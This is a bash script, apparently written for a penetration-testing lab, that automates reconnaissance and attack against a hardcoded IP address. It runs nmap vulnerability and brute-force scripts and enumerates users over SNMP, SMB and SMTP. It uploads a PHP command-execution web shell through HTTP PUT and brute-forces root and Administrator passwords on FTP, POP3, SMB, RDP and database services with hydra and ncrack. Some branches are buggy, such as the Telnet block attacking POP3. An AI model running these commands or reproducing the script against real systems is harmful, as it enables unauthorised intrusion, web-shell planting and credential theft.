#!/bin/bash
clear

### Preperation ###
# Check if the required files exist

# Community String
if [ ! -f community ];then
        echo "[+] Creating the community string"
        echo -e "public\nprivate\ncommunity" > community
else
	echo "[+] community string exists!"
fi

# GoBuster
GB=$(dpkg -l gobuster | grep ii | cut -d" " -f3)

if [ $GB != "gobuster" ];then
	echo "[+] Downloading GoBuster"
	apt-get install gobuster -y
else
	echo "[+] GoBuster exists!"
fi

# vulscan
if [ ! -d vulscan ];then
        echo "[+] Downloading the Vulscan-Script for Nmap.."
        wget http://computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
        wget http://computec.ch/projekte/vulscan/download/scipvuldb.csv
        rm nmap_nse_vulscan-2.0.tar.gz
        echo "Done!"
else
	echo "[+] Vulscan exists!"
fi

# rockyou.txt
if [ -e /usr/share/wordlists/rockyou.txt.gz ];then
	echo "[+] RockYou.txt.gz found.. starting decompression."
	gzip -d /usr/share/wordlists/rockyou.txt.gz

elif [ ! -e /usr/share/wordlists/rockyou.txt.gz ] && [ ! -e /usr/share/wordlists/rockyou.txt ];then
	echo -e "[-] RockYou.txt doesn't exists.\nDownloading RockYou.txt."
	echo -e "This can take a while.\n"
	wget http://scrapmaker.com/data/wordlists/dictionaries/rockyou.txt
else
	echo "[+] RockYou.txt exists!"
fi

# Seclists
if [ ! -d /usr/share/seclists ];then
	echo "[+] Downloading SecLists"
        apt-get install seclists
else
	echo -e "[+] SecLists exists!\n"
fi

sleep 3s
clear

echo -e "\t\t#############################################"
echo -e "\t\t#------------Scanning Script----------------#"
echo -e "\t\t#-------------------------------------------#"
echo -e "\t\t#-------------------by----------------------#"
echo -e "\t\t#-------------------------------------------#"
echo -e "\t\t#----------------CRY0L1T3-------------------#"
echo -e "\t\t#-------------------------------------------#"
echo -e "\t\t#############################################\n\n"





TARGET="10.0.11.101"

### DNS ###
# Scanning the whole network for DNS servers
echo "Scanning for DNS Servers..."
nmap -p U:53,T:53 "$(echo $TARGET | cut -d"." -f1-3)".0 --open | grep for | cut -d" " -f5 > dns.txt


if [ ! -s dns.txt ] || [ ! -f dns.txt ] ;then
    echo "[-] No DNS Servers found."

    ### Light Scan ###
    echo -e "\n[*] Starting light Scan for $TARGET..."
    nmap -p U:161,3389,T:21,22,23,110,80,443,137-139,445,25,3306,1433,1521,79,5432 "$TARGET" --open -sV > $TARGET-light.txt
    echo "[+] Light scan for $TARGET Done!"


    # Grab Domain-Name
    echo "[+] Grabbing the Domain-Name for $TARGET & will be saved into $TARGET-domain_name.txt"
    cat $TARGET-light.txt | grep "Service Info" | awk -F" " '{print $4}' | sed 's/;/ /g' > $TARGET-domain_name.txt


    # Grab Service Names
    echo "[+] Grabbing the Service-Names fot $TARGET & will be saved into $TARGET-light_services.txt"
    cat $TARGET-light.txt | grep "tcp\|udp" | awk -F" " '{print $1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11}' > $TARGET-light_services.txt

    ### OS identification ###
    if grep -q "Linux" $TARGET-light.txt;then
    	OS="Linux"
    elif grep -q "Windows" $TARGET-light.txt;then
    	OS="Windows"
    else
    	OS=""
    fi


    ### Grab the Ports ###
    # FTP
    if grep -q "ftp" $TARGET-light.txt; then
    	echo -e "\n[+] FTP found!"
    	echo "Scanning..."
    	nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p21 "$TARGET" > $TARGET-ftp.txt
	
        FTP=true
	echo ""
    fi


    # POP3
    if grep -q "pop3" $TARGET-light.txt;then
	echo "[+] POP3 found!"
	echo "Scanning..."
	nmap --script=pop3-brute,pop3-capabilities,pop3-ntlm.info -p110 "$TARGET" > $TARGET-pop3.txt

	POP3=true

	echo ""	
    fi


    # Telnet
    if grep -q "telnet" $TARGET-light.txt; then
        
        echo "[+] Telnet found!"
	echo "Scanning..."
	nmap --script=telnet-brute,telnet-encryption,telnet-ntlm-info "$TARGET" > $TARGET-telnet.txt

	TELNET=true

	echo ""
    fi


    # PostgreSQL
    if grep -q "postgresql" $TARGET-light.txt;then
        echo "[+] PostgreSQL found!"
        echo "Scanning..."
    	nmap --script=pgsql-brute "$TARGET" -p5432 > $TARGET-pgsql.txt

    	PGSQL=true

    	echo ""
    fi


    # SNMP
    if grep -q "snmp" $TARGET-light.txt; then
	
        echo "[+] SNMP found!"
	echo "Scanning..."

	echo -e "public\nprivate\ncommunity" > community
	snmpwalk -c public -v1 "$TARGET" > $TARGET-snmp.txt
	snmp-check -t "$TARGET" -c public >> $TARGET-snmp.txt
	onesixtyone -c community -i "$TARGET" >> $TARGET-snmp.txt
	nmap -vv -sV -sU -Pn --script=snmp-netstat,snmp-processes "$TARGET" -p161 >> $TARGET-snmp.txt

	# Windows Services
	snmpwalk -c public -v1 "$TARGET" 1.3.6.1.2.1.25.4.2.1.2 > $TARGET-snmp_services.txt

	# User enumeration
	/usr/share/doc/python-impacket/examples/samrdump.py SNMP "$TARGET" > $TARGET-snmp_users.txt
	snmpwalk -c public -v1 "$TARGET" 1.3.6.1.4.1.77.1.2.25

	SNMP=true

	cat $TARGET-snmp_users.txt >> $TARGET-userlist.txt

	echo ""
    fi


    # HTTP
    if grep -q "http" $TARGET-light.txt;then
	        
        echo "[+] HTTP found!"
	echo "Scanning..."
	echo -e "\n[+] Nikto is running..."
	nikto -C all -h "$TARGET" > $TARGET-http.txt

	echo -e "\n[+] Get HEADER..."
	curl -i "$TARGET" > $TARGET-http-header.txt

        echo -e "\n[+] Get Everything..."
        curl -i -L "$TARGET" > $TARGET-http-all.txt

        echo -e "\n[+] Checking for PUT method.."
        curl -v -X OPTIONS http://"$TARGET" > $TARGET-http-options.txt
        curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$TARGET/test/shell.php
        curl -i -L http://"$TARGET"/test/shell.php > $TARGET-http-put_shell.txt


        if [ -f $TARGET-http-put_shell.txt ];then
            cat $TARGET-http-put_shell.txt
        else
            echo "[-] PUT Method doesn't work. :("
        fi


        echo -e "\n[+] Uniscan is running..."
        uniscan -u http://"$TARGET" -qweds >> $TARGET-http.txt

        echo -e "\n[+] Nmap vulscan running..."
        nmap --script "$(pwd)"/vulscan/vulscan.nse --script-args="$(pwd)"/vulscan/scipvuldb.csv "$TARGET" > $TARGET-vulscan.txt

        echo -e "\n[+] Directory bruteforcing with dirb..."
        dirb http://"$TARGET" /usr/share/wordlists/dirb/common.txt | grep -v "Testing" > $TARGET-dirs.txt

        echo -e "\n[+] Directory bruteforcing with gobuster..."
        gobuster -u http://"$TARGET" -w /usr/share/seclists/Discovery/Web_Content/common.txt -s "200,204,301,302,307,403,500" -e "403" > $TARGET-gobuster.txt

        echo -e "\n[+] Kernel Scanning..."
        xprobe2 -v -p tcp:80:open "$TARGET" > $TARGET-kernel.txt


        if grep -q "wp" $TARGET-http.txt;then
            echo -e "\n[+] WordPress found!"
            echo "Scanning... (type ENTER after few minutes)"
            wpscan -url http://"$TARGET" --enumerate p > $TARGET-http-wordpress.txt
        fi
        
        HTTP=true
        
        echo ""
    fi


    # HTTPS
    if grep -q "443" $TARGET-light.txt; then

        echo "[+] HTTPS found!"
        echo "Scanning..."

        sslscan "$TARGET":443 > $TARGET-https.txt

        echo ""
    fi


    # SMTP
    if grep -q "smtp" $TARGET-light.txt; then

        echo "[+] SMTP found!"
        echo "Scanning..."
        nmap --script=smtp-commands,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p25 "$TARGET" > $TARGET-smtp.txt

        # Users
        nmap --script smtp-enum-users "$TARGET" -p25 > $TARGET-smtp_users.txt

        SMTP=true

	cat $TARGET-smtp_users.txt >> $TARGET-userlist.txt

        echo ""
    fi


    # NetBIOS
    if grep -q "netbios-ssn\|microsoft-ds\|smb" $TARGET-light.txt; then

        echo "[+] SMB found!"
        echo "Scanning..."
        nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse "$TARGET" -p137-139,445 > $TARGET-smb.txt
		
        enum4linux -a "$TARGET" >> $TARGET-smb.txt

        # Users
        nmap -sSU --script=smb-enum-users -p U:137,T:139,445 "$TARGET" > $TARGET-smb_users.txt

        NETBIOS=true

        cat $TARGET-smb_users.txt >> $TARGET-userlist.txt

        echo "Try to login for example with:\nrpcclient -U '' $TARGET\nor\nsmbclient -L $TARGET\nsmbclient //$TARGET\nsmbclient \\\\$TARGET\\ipc$ -U john\nsmbclient //$TARGET/ipc$ -U john\n" >> $TARGET-smb.txt
        echo ""
        
    fi


    # ORACLE
    if grep -q "oracle" $TARGET-light.txt; then

        echo "[+] Oracle found!"
        echo "Scanning..."
        echo "[+] Oscanner running..."
        oscanner -s "$TARGET" -P 1521 > $TARGET-oracle.txt

        echo "[+] tnscmd10g running..."
        tnscmd10g version -h "$TARGET" >> $TARGET-oracle.txt
        tnscmd10g status -h "$TARGET" >> $TARGET-oracle.txt

        # USER Bruteforce
        echo "[+] User bruteforcing..."
        nmap --script=oracle-sid-brute,oracle-brute -p1521 "$TARGET" > $TARGET-oracle_users.txt

        ORACLE=true

        cat $TARGET-oracle-users.txt >> $TARGET-userlist.txt

        echo ""
    fi


    # MSSQL
    if grep -q "mssql" $TARGET-light.txt; then

        echo "[+] MSSQL found!"
        echo "Scanning..."

        nmap -sU --script ms-sql-info "$TARGET" -p 1433 > $TARGET-mssql.txt
        echo "Try to login for example with:\nsqsh -S $TARGET -U sa" >> $TARGET-mssql.txt

        MSSQL=true

        echo ""
    fi


    # MySQL
    if grep -q "mysql" $TARGET-light.txt;then

        echo "[+] MySQL found!"
        echo "Scanning..."
        nmap -sV -Pn -script mysql* "$TARGET" -p 3306 > $TARGET-mysql.txt

        echo "Try to login for example with:\nmysql --host=$TARGET -u root -p" >> $TARGET-mysql.txt

        MYSQL=true

        echo ""
    fi


    # RDP
    if grep -q "rdp" $TARGET-light.txt || grep -q "3389" $TARGET-light.txt;then

        echo "[+] RDP found!"
        echo "Scanning..."
        nmap --script rdp* -p 3389 "$TARGET" > $TARGET-rdp.txt

        echo "Try to login for example with:\nrdesktop -u guest -p guest $TARGET -g 94%" >> $TARGET-mysql.txt

        RDP=true

        echo ""
    fi


    # RPC
    if grep -q "rpc" $TARGET-light.txt || grep -q "111" $TARGET-light.txt; then

        echo "[+] RPC found!"
        echo "Scanning..."
        rpcinfo -p "$TARGET" > $TARGET-rpc.txt

        RPC=true
        echo ""
    fi


    ### Heavy Scan ###
    clear

    echo "Starting Heavy Scan for $TARGET in the background...\nYou should take a coffee.. or 10..."
    nmap --script discovery,vuln -sSU -p- "$TARGET" > $TARGET-heavy.txt  
    
    echo "[+] Heavy Scan Done!"

else
    DNS=$(cat dns.txt | paste -sd " ")

    # FTP
    if grep -q "ftp" $TARGET-light.txt; then

        echo "[+] FTP found!"
        echo "Scanning..."
        nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p21 "$TARGET" --dns-servers "$DNS" > $TARGET-ftp.txt

        FTP=true

        echo ""
    fi


    # POP3
    if grep -q "pop3" $TARGET-light.txt;then

        echo "[+] POP3 found!"
        echo "Scanning..."
        nmap --script=pop3-brute,pop3-capabilities,pop3-ntlm.info -p110 "$TARGET" --dns-servers "$DNS" > $TARGET-pop3.txt

        POP3=true

        echo ""
    fi


    # Telnet
    if grep -q "telnet" $TARGET-light.txt; then

        echo "[+] Telnet found!"
        echo "Scanning..."
        nmap --script=telnet-brute,telnet-encryption,telnet-ntlm-info "$TARGET" -p23 --dns-servers "$DNS" > $TARGET-telnet.txt

        TELNET=true

        echo ""
    fi


    # PostgreSQL
    if grep -q "postgresql" $TARGET-light.txt;then

        echo "[+] PostgreSQL found!"
        echo "Scanning..."
        nmap --script=pgsql-brute "$TARGET" -p5432 --dns-servers "$DNS" > $TARGET-pgsql.txt

        PGSQL=true

        echo ""
    fi


    # SNMP
    if grep -q "snmp" $TARGET-light.txt; then

        echo "[+] SNMP found!"
        echo "Scanning..."

        echo -e "public\nprivate\ncommunity" > community
        snmpwalk -c public -v1 "$TARGET" > $TARGET-snmp.txt
        snmp-check -t "$TARGET" -c public >> $TARGET-snmp.txt
        onesixtyone -c community -i "$TARGET" >> $TARGET-snmp.txt
        nmap -vv -sV -sU -Pn --script=snmp-netstat,snmp-processes "$TARGET" -p161 --dns-servers "$DNS" >> $TARGET-snmp.txt

        # Windows Services
        snmpwalk -c public -v1 "$TARGET" 1.3.6.1.2.1.25.4.2.1.2 > $TARGET-snmp_services.txt

        # User enumeration
        /usr/share/doc/python-impacket/examples/samrdump.py SNMP "$TARGET" > $TARGET-snmp_users.txt
        snmpwalk -c public -v1 "$TARGET" 1.3.6.1.4.1.77.1.2.25

        SNMP=true

        cat $TARGET-snmp_users.txt >> $TARGET-userlist.txt

        echo ""
    fi


    # HTTP
    if grep -q "http" $TARGET-light.txt; then

        echo "[+] HTTP found!"
        echo "Scanning..."

        echo "[+] Nikto is running..."
        nikto -C all "$TARGET" > $TARGET-http.txt

        echo "[+] Get HEADER..."
        curl -i "$TARGET" > $TARGET-http-header.txt

        echo "[+] Get Everything..."
        curl -i -L "$TARGET" > $TARGET-http-all.txt

        echo "[+] Checking for PUT method.."
        curl -v -X OPTIONS http://"$TARGET" > $TARGET-http-options.txt
        curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$TARGET/test/shell.php > $TARGET-http-put_shell.txt
        curl -i -L http://"$TARGET"/test/shell.php >> $TARGET-http-put_shell.txt


        if [ ! -f $TARGET-http-put_shell.txt ];then
            echo "[-] PUT Method doesn't work. :("
        fi


        echo -e "\n[+] Uniscan is running..."
        uniscan -u http://"$TARGET" -qweds >> $TARGET-http.txt

        echo -e "\n[+] Nmap vulscan running..."
        nmap --script "$(pwd)"/vulscan/vulscan.nse --script-args="$(pwd)"/vulscan/scipvuldb.csv "$TARGET" --dns-servers "$DNS" > $TARGET-vulscan.txt

        echo -e "\n[+] Directory bruteforcing with dirb..."
        dirb -w http://"$TARGET" /usr/share/wordlists/dirb/common.txt > $TARGET-dirs.txt

        echo -e "\n[+] Directory bruteforcing with gobuster..."
        gobuster -u http://"$TARGET" -w /usr/share/seclists/Discovery/Web_Content/common.txt -s "200,204,301,302,307,403,500" -e "403"

        echo -e "\n[+] Kernel Scanning..."
        xprobe2 -v -p tcp:80:open "$TARGET" > $TARGET-kernel.txt


        if grep -q "wp" $TARGET-http.txt;then

            echo -e "\n[+] WordPress found!"
            echo "Scanning..."
            wpscan -url http://"$TARGET" --enumerate p > $TARGET-http-wordpress.txt
        fi
    fi
    

    HTTP=true
    echo ""


    # HTTPS
    if grep -q "443" $TARGET-light.txt; then

        echo "[+] HTTPS found!"
        echo "Scanning..."
        sslscan "$TARGET":443 > $TARGET-https.txt

        echo ""
    fi


    # SMTP
    if grep -q "smtp" $TARGET-light.txt; then

        echo "[+] SMTP found!"
        echo "Scanning..."
        nmap --script=smtp-commands,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p25 "$TARGET" --dns-servers "$DNS" > $TARGET-smtp.txt

        # Users
        nmap --script smtp-enum-users "$TARGET" -p25 --dns-servers "$DNS" > $TARGET-smtp_users.txt

        SMTP=true

        cat $TARGET-smtp_users.txt >> $TARGET-userlist.txt

        echo ""
    fi



    # NetBIOS
    if grep -q "netbios-ssn\|microsoft-ds\|smb" $TARGET-light.txt; then

        echo "[+] SMB found!"
        echo "Scanning..."
        nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse "$TARGET" -p137-139,445 --dns-servers "$DNS" > $TARGET-smb.txt

        enum4linux -a "$TARGET" >> $TARGET-smb.txt

        # Users
        nmap -sSU --script=smb-enum-users -p U:137,T:139,445 "$TARGET" --dns-servers "$DNS" > $TARGET-smb_users.txt

        NETBIOS=true

        cat $TARGET-smb_users.txt >> $TARGET-userlist.txt

        echo "Try to login for example with:\nrpcclient -U '' $TARGET\nor\nsmbclient -L $TARGET\nsmbclient //$TARGET\nsmbclient \\\\$TARGET\\ipc$ -U john\nsmbclient //$TARGET/ipc$ -U john\n" >> $TARGET-smb.txt

        echo ""
    fi


    # ORACLE
    if grep -q "oracle" $TARGET-light.txt; then

        echo "[+] Oracle found!"
        echo "Scanning..."

        echo "[+] Oscanner running..."
        oscanner -s "$TARGET" -P 1521 > $TARGET-oracle.txt

        echo "[+] tnscmd10g running..."
        tnscmd10g version -h "$TARGET" >> $TARGET-oracle.txt
        tnscmd10g status -h "$TARGET" >> $TARGET-oracle.txt

        # USER Bruteforce
        echo "[+] User bruteforcing..."
        nmap --script=oracle-sid-brute,oracle-brute -p1521 "$TARGET" --dns-servers "$DNS" > $TARGET-oracle_users.txt

        ORACLE=true

        cat $TARGET-oracle-users.txt >> $TARGET-userlist.txt

        echo ""
    fi


    # MSSQL
    if grep -q "mssql" $TARGET-light.txt; then

        echo "[+] MSSQL found!"
        echo "Scanning..."
        nmap -sU --script ms-sql-info "$TARGET" -p 1433 --dns-servers "$DNS" > $TARGET-mssql.txt

        echo "Try to login for example with:\nsqsh -S $TARGET -U sa" >> $TARGET-mssql.txt

        MSSQL=true

        echo ""
    fi


    # MySQL
    if grep -q "mysql" $TARGET-light.txt;then

        echo "[+] MySQL found!"
        echo "Scanning..."
        nmap -sV -Pn -script mysql* "$TARGET" --dns-servers "$DNS" > $TARGET-mysql.txt

        echo "Try to login for example with:\nmysql --host=$TARGET -u root -p" >> $TARGET-mysql.txt

        MYSQL=true

        echo ""
    fi


    # RDP
    if grep -q "rdp" $TARGET-light.txt || grep -q "3389" $TARGET-light.txt;then

        echo "[+] RDP found!"
        echo "Scanning..."
        nmap --script rdp* -p 3389 "$TARGET" --dns-servers "$DNS" > $TARGET-rdp.txt

        echo "Try to login for example with:\nrdesktop -u guest -p guest $TARGET -g 94%" >> $TARGET-mysql.txt

        RDP=true

        echo ""
    fi



    # RPC
    if grep -q "rpc" $TARGET-light.txt || grep -q "111" $TARGET-light.txt; then

        echo "[+] RPC found!"
        echo "Scanning..."
        rpcinfo -p "$TARGET" > $TARGET-rpc.txt

        RPC=true
        echo ""
    fi


    ### Heavy Scan ###
    echo -e "Starting Heavy Scan for $TARGET in the background...You should take a coffee.. or 10..."
    nmap --script discovery,vuln -sSU -p- "$TARGET" --dns-servers "$DNS"> $TARGET-heavy.txt &
    
    echo "[+] Heavy Scan Done!"

fi



#----------------------------------------------
### Brute Forcing the Services ###
clear
echo "Start Bruteforcing..\n"


if [ $FTP == "true" ];then

    echo "[+] Start FTP-Bruteforcing for $TARGET"
    if [ $OS == "Linux" ];then
    	hydra -l root -P /usr/share/wordlists/rockyou.txt -f "$TARGET" ftp -v
    elif [ $OS == "Windows" ];then
        hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -f "$TARGET" ftp -v
    else
        echo "[-] Bruteforcing stopped\nNo OS specification!\n"

    fi
fi

if [ $POP3 == "true" ];then

    echo "[+] Start POP3-Bruteforcing for $TARGET"
    if [ $OS == "Linux" ];then
        hydra -l root -P /usr/share/wordlists/rockyou.txt -f "$TARGET" pop3 -v
    elif [ $OS == "Windows" ];then
        hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -f "$TARGET" pop3 -v
    else
        echo "[-] Bruteforcing stopped\nNo OS specification!\n"
    fi
fi

if [ $TELNET == "true" ];then

    echo "[+] Start Telnet-Bruteforcing for $TARGET"
    if [ $OS == "Linux" ];then
        hydra -l root -P /usr/share/wordlists/rockyou.txt -f "$TARGET" pop3 -v
    elif [ $OS == "Windows" ];then
        hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -f "$TARGET" pop3 -v
    else
        echo "[-] Bruteforcing stopped\nNo OS specification!\n"
    fi
fi


if [ $SMTP == "true" ];then
    echo "[+] SMTP Bruteforcing..."
    nmap --script smtp-brute "$TARGET" > $TARGET-smtp-brute.txt

    clear
fi


if [ $NETBIOS == "true" ];then
    echo "[+] Start SMB-Bruteforcing for $TARGET"
    if [ $OS == "Linux" ];then
        hydra -l root -P /usr/share/wordlists/rockyou.txt -f "$TARGET" smb -v
    elif [ $OS == "Windows" ];then
        hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -f "$TARGET" smb -v
    else
        echo "[-] Bruteforcing stopped\nNo OS specification!\n"
    fi
fi


if [ $RDP == "true" ];then

    echo "[+] Start RDP-Bruteforcing for $TARGET"
    if [ $OS == "Windows" ];then
	ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://"$TARGET" > $TARGET-rdp-bruteforce.txt
    else
        echo "[-] Bruteforcing stopped\nNo Windows OS!\n"
    fi
fi


if [ $PGSQL == "true" ];then

    echo "[+] Start PostgreSQL-Bruteforcing for $TARGET"
    if [ $OS == "Linux" ];then
        hydra -l root -P /usr/share/wordlists/rockyou.txt -f "$TARGET" postgres -v
    elif [ $OS == "Windows" ];then
        hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -f "$TARGET" postgres -v
    else
        echo "[-] Bruteforcing stopped\nNo OS specification!\n"

    fi
fi


if [ $MYSQL == "true" ];then

    echo "[+] Start MySQL-Bruteforcing for $TARGET"
    if [ $OS == "Linux" ];then
        hydra -l root -P /usr/share/wordlists/rockyou.txt -f "$TARGET" mysql -v
    elif [ $OS == "Windows" ];then
        hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -f "$TARGET" mysql -v
    else
        echo "[-] Bruteforcing stopped\nNo OS specification!\n"

    fi
fi



clear

### Vuln research ###
echo "[+] Vulnerability Research"
nmap --script "$(pwd)"/vulscan/vulscan.nse --script-args="$(pwd)"/vulscan/exploitdb.csv "$TARGET" > $TARGET-vulscan.txt;


